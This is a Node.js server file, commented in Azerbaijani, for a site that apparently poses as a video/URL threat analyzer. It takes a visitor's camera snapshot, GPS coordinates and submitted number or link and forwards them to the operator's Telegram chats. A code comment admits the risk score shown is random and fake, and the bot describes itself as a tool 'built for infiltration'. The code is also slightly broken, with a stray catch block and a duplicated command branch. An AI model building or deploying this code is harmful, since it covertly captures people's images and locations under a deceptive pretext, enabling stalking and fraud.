// server.js
const express = require('express');
const path = require('path');
const FormData = require('form-data');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_IDS = process.env.TELEGRAM_CHAT_IDS
  ? process.env.TELEGRAM_CHAT_IDS.split(',').map(id => id.trim())
  : [];

if (!TELEGRAM_BOT_TOKEN || TELEGRAM_CHAT_IDS.length === 0) {
  console.error('❌ Telegram token və ya chat ID-lər tapılmadı!');
} else {
  console.log('✅ Telegram token və chat ID-lər uğurla yükləndi.');
  console.log('👥 Adminlər:', TELEGRAM_CHAT_IDS);
}

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// ===================================================
// 🔹 Telegrama məlumat göndərmək üçün köməkçi funksiya
// ===================================================
async function sendToTelegram(messageText, imageBuffer = null) {
  for (const chatId of TELEGRAM_CHAT_IDS) {
    // Mətn mesajı
    const msgRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: messageText,
        parse_mode: 'Markdown'
      })
    });
    if (!msgRes.ok) console.error(`⚠️ Chat ${chatId} üçün mesaj xətası`);

    // Şəkil varsa
    if (imageBuffer) {
      const form = new FormData();
      form.append('chat_id', chatId);
      form.append('photo', imageBuffer, {
        filename: 'capture.jpg',
        contentType: 'image/jpeg'
      });
      form.append('caption', '📷 Kamera görüntüsü alındı');

      const imgRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: form,
        headers: form.getHeaders()
      });
      if (!imgRes.ok) console.error(`⚠️ Chat ${chatId} üçün şəkil xətası`);
    }
  }
}

// ===================================================
// 🔹 Frontend-dən gələn məlumatları qəbul et
// ===================================================
app.post('/api/send-data', async (req, res) => {
  const { videoUrl, location, image } = req.body;
  console.log(`📩 Yeni məlumat alındı: video=${!!videoUrl}, location=${!!location}, image=${!!image}`);

  let messageText = '';

if (videoUrl) {
  messageText += `📞 Nömrə: ${videoUrl}\n`;
}

if (location?.latitude && location?.longitude) {
  messageText += `📍 Lokasiya alındı\n`;
  messageText += `🌍 ${location.latitude}, ${location.longitude}`;
} else {
  messageText += `📍 Lokasiya alınmadı`;
}


    // URL analiz nəticəsini saxta şəkildə əlavə edirik
    if (videoUrl) {
      const randomRisk = (Math.random() * 100).toFixed(1);
      const resultText = randomRisk > 70
        ? `🚨 *Təhlükə səviyyəsi:* ${randomRisk}% — Yüksək risk!`
        : randomRisk > 40
        ? `⚠️ *Təhlükə səviyyəsi:* ${randomRisk}% — Orta risk.`
        : `✅ *Təhlükə səviyyəsi:* ${randomRisk}% — Təhlükə aşkarlanmadı.`;
      messageText += resultText + '\n\n';
    }

    if (location?.latitude && location?.longitude) {
      messageText += `📍 *Lokasiya:* [Xəritədə bax](https://www.google.com/maps?q=${location.latitude},${location.longitude})\n`;
      messageText += `Enlem: ${location.latitude}\nBoylam: ${location.longitude}\n`;
    } else {
      messageText += `📍 Lokasiya əldə edilmədi və ya rədd edildi.\n`;
    }

    // Şəkil varsa
    let imageBuffer = null;
    if (image) {
      const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
      imageBuffer = Buffer.from(base64Data, 'base64');
    }

    await sendToTelegram(messageText, imageBuffer);
    res.json({ ok: true, message: 'Məlumat Telegrama göndərildi.' });

  } catch (err) {
    console.error('❌ Xəta:', err.message);
    res.status(500).json({ message: err.message });
  }
});

// ===================================================
// 🔹 Telegram komandaları üçün webhook
// ===================================================
app.post(`/webhook/${TELEGRAM_BOT_TOKEN}`, express.json(), async (req, res) => {
  const message = req.body.message;

  if (!message || !message.text) return res.sendStatus(200);
  const chatId = message.chat.id;
  const text = message.text.trim();

    if (text === '/start') {
    await sendToTelegram(`👾 Welcome ${message.from.first_name || ''}!
Your terminal awaits. Prepare for the scan.
Use commands to probe, analyze, and conquer:
👉 /link — submit a target URL
👉 /about — read the mission briefing`, null);
  }

      else if (text === '/start') {
    await sendToTelegram(`👋 *Welcome:*
welcome`, null);
  }

      
  else if (text === '/about') {
    await sendToTelegram(`ℹ️ *About:*
💀 *Mission Briefing:*
This bot is a digital reconnaissance tool, built for infiltration and analysis.
Every byte counts. Every URL is a target.  
Only the vigilant survive.  
Proceed with caution. ⚡️`, null);
  }

  else if (text === '/link') {
    await sendToTelegram(`📎 https://video-analyzer-server.onrender.com`, null);
  }

  res.sendStatus(200);
});

// ===================================================
// 🔹 Static (frontend) fayllar
// ===================================================
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ===================================================
// 🔹 Serverin işə düşməsi
// ===================================================
app.listen(PORT, () => console.log(`🚀 Server ${PORT} portunda işləyir`));
